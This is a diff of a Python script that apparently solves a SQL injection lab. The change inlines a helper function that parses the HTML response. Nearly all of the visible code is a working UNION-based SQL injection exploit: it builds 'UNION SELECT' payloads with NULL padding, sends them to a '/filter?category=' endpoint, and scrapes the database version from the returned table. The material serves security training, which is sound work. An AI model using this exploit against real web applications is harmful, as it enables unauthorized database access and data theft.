@@ -11,11 +11,6 @@ def get_num_of_columns(lab_url):
             break
     return num_of_columns
 
-def extract_text(response):
-    soup = BeautifulSoup(response.text, 'html.parser')
-    version_string = soup.find('tbody')
-    return version_string.get_text().strip()
-
 def get_db_version(num_of_columns):
     for i in range(num_of_columns):
         payload = ["NULL"] * num_of_columns
@@ -24,7 +19,9 @@ def get_db_version(num_of_columns):
         url = f"{lab_url}/filter?category=x'+UNION+SELECT+{payload}%23"
         response = requests.get(url)
         if response.status_code == 200:
-            return extract_text(response)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            version_string = soup.find('tbody')
+            return version_string.get_text().strip()
 
 if __name__=="__main__":
     try:
